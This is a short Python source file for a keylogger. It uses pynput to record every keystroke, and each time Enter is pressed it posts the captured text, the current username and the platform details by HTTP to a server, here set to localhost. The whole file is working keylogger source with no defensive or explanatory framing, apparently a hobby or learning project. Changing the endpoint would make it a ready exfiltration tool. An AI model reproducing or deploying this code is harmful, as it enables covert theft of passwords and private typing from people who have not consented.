from pynput import keyboard
import requests
import getpass
import platform

log  = ""

def send_log():
    global log

    info = {
        'username': getpass.getuser(),
        'system': platform.platform(),
        'Keyboardlog': log
    }

    response = requests.post('http://localhost:3000', data = info)
    print(response)
    print(log)
    log = ""

def key_caption(key):
    global log

    try:
        if(key == keyboard.Key.enter):
            send_log()
        elif(key == keyboard.Key.backspace):
            log = log[:-1]
        elif(key == keyboard.Key.space):
            log += " "
        else:
            try:
                log += key.char
            except:
                pass
    except:
        pass


if(__name__ == "__main__"):
    with keyboard.Listener(
        on_press=key_caption
    ) as listener: listener.join()